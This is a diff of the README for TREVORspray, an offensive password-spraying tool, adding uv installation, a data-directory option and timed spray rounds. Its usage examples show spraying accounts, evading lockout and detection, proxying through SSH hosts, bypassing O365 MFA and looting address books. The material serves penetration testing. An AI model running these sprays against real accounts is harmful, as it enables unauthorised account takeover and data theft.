@@ -4,12 +4,24 @@ TREVORspray is a modular password sprayer with threading, SSH proxying, loot mod
 By [@thetechr0mancer](https://twitter.com/thetechr0mancer)
 
 [![License](https://img.shields.io/badge/license-GPLv3-blue.svg)](https://raw.githubusercontent.com/blacklanternsecurity/nmappalyzer/master/LICENSE)
-[![Python Version](https://img.shields.io/badge/python-3.6+-blue)](https://www.python.org)
+[![Python Version](https://img.shields.io/badge/python-3.9+-blue)](https://www.python.org)
 
 ## Installation:
+Requires [uv](https://docs.astral.sh/uv/getting-started/installation/) (`brew install uv` or `curl -LsSf https://astral.sh/uv/install.sh | sh`). uv will fetch Python 3.9+ automatically if needed.
+
 ~~~bash
-pip install git+https://github.com/blacklanternsecurity/trevorproxy
-pip install git+https://github.com/blacklanternsecurity/trevorspray
+uv tool install git+https://github.com/blacklanternsecurity/trevorspray
+trevorspray --help
+~~~
+
+This installs `trevorspray` into its own isolated environment and puts it on your `PATH` (run `uv tool update-shell` if the command isn't found). Upgrade later with `uv tool upgrade trevorspray`.
+
+### Development
+~~~bash
+git clone https://github.com/blacklanternsecurity/trevorspray
+cd trevorspray
+uv sync
+uv run trevorspray --help
 ~~~
 
 See the accompanying [**Blog Post**](blogpost.md) for a fun rant and some cool demos!
@@ -26,12 +38,14 @@ See the accompanying [**Blog Post**](blogpost.md) for a fun rant and some cool d
   - `anyconnect` (Cisco VPN)
   - custom modules (easy to make!)
 - Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.
-- Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)
+- Automatic cancel/resume (remembers already-tried user/pass combos in `tried_logins.txt` in the data directory)
+- Configurable data directory for logs, tried/valid logins, and loot (`--data-dir` or `$TREVORSPRAY_DATA_DIR`, default `~/.trevorspray`)
 - Round-robin proxy through multiple IPs with `--ssh` or `--subnet`
 - Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
 - Spoofs `User-Agent` and other signatures to look like legitimate auth traffic
 - Comprehensive logging
 - Optional `--delay`, `--jitter`, and `--lockout-delay` between requests to bypass lockout countermeasures
+- Spray in rounds: N passwords against the full user list, then pause (`--passwords-per-round`, `--round-delay`)
 - IPv6 support
 - O365 MFA bypass support (disable with `--no-loot`)
   - IMAP
@@ -88,6 +102,19 @@ trevorspray -u emails.txt -p 'Welcome123' --url https://login.windows.net/b439d7
 trevorspray -u bob@evilcorp.com -p 'Welcome123' --delay 5
 ```
 
+## Example: Spray 2 passwords per round, then pause 61 minutes between rounds
+Each round sprays its passwords against the entire user list. The pause starts after the last request of the round finishes, and there's no pause after the final round. Progress is saved to disk after every round, so an interrupted spray resumes where it left off (rounds made up entirely of previously-tried logins don't pause).
+```bash
+trevorspray -u emails.txt -p passwords.txt --passwords-per-round 2 --round-delay 61
+```
+
+## Example: Keep all output (logs, tried/valid logins, loot) in a per-engagement folder
+```bash
+trevorspray -u emails.txt -p 'Welcome123' --data-dir ~/engagements/evilcorp/trevorspray
+# or set it once for your shell
+export TREVORSPRAY_DATA_DIR=~/engagements/evilcorp/trevorspray
+```
+
 ## Example: Spray and round-robin between 3 IPs (the current IP is also used, unless `-n` is specified)
 ```bash
 trevorspray -u emails.txt -p 'Welcome123' --ssh root@1.2.3.4 root@4.3.2.1
@@ -114,7 +141,7 @@ trevorspray -u f.last.txt -p 'Welcome123'
 ```
 
 ## Extract data from downloaded LZX files
-When TREVORspray successfully bypasses MFA and retrieves an Offline Address Book (OAB), the address book is downloaded in LZX format to `~/.trevorspray/loot`. LZX is an ancient and obnoxious compression algorithm used by Microsoft.
+When TREVORspray successfully bypasses MFA and retrieves an Offline Address Book (OAB), the address book is downloaded in LZX format to `loot/` in the data directory (default `~/.trevorspray/loot`). LZX is an ancient and obnoxious compression algorithm used by Microsoft.
 ~~~bash
 # get libmspack (for extracting LZX file)
 git clone https://github.com/kyz/libmspack
@@ -135,7 +162,7 @@ egrep -oa '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' oab.bin | tr '[:uppe
 ```
 $ trevorspray --help
 usage: trevorspray [-h] [-m {owa,okta,auth0,anyconnect,jumpcloud,adfs,msol,example}] [-up USERPASS [USERPASS ...]] [-u USERS [USERS ...]] [-p PASSWORDS [PASSWORDS ...]] [--url URL]
-                   [-r DOMAIN] [--export-tenants FILE] [-t THREADS] [-f] [-d DELAY] [-ld LOCKOUT_DELAY] [-j JITTER] [-e] [-nl] [--ignore-lockouts] [--timeout TIMEOUT] [--random-useragent]
+                   [-r DOMAIN] [--export-tenants FILE] [-t THREADS] [-f] [-d DELAY] [-ld LOCKOUT_DELAY] [-j JITTER] [-ppr PASSWORDS_PER_ROUND] [-rd ROUND_DELAY] [--data-dir DATA_DIR] [-e] [-nl] [--ignore-lockouts] [--timeout TIMEOUT] [--random-useragent]
                    [-6] [--proxy PROXY] [-v] [-s USER@SERVER [USER@SERVER ...]] [-i KEY] [-b BASE_PORT] [-n] [--subnet SUBNET] [--interface INTERFACE]
 
 A password sprayer with the option to load-balance traffic through SSH hosts
@@ -168,6 +195,11 @@ advanced arguments:
   -ld, --lockout-delay LOCKOUT_DELAY
                         Sleep for this many additional seconds when a lockout is encountered
   -j, --jitter JITTER   Add a random delay of up to this many seconds between requests
+  -ppr, --passwords-per-round PASSWORDS_PER_ROUND
+                        Spray this many passwords against the full user list, then pause for --round-delay (default: 1 if --round-delay is set)
+  -rd, --round-delay ROUND_DELAY
+                        Minutes to pause between rounds of --passwords-per-round (e.g. 61 to wait out a 60-minute lockout window)
+  --data-dir DATA_DIR   Directory for logs, tried/valid logins, and loot (default: $TREVORSPRAY_DATA_DIR or ~/.trevorspray)
   -e, --exit-on-success
                         Stop spray when a valid cred is found
   -nl, --no-loot        Don't execute loot activites for valid accounts
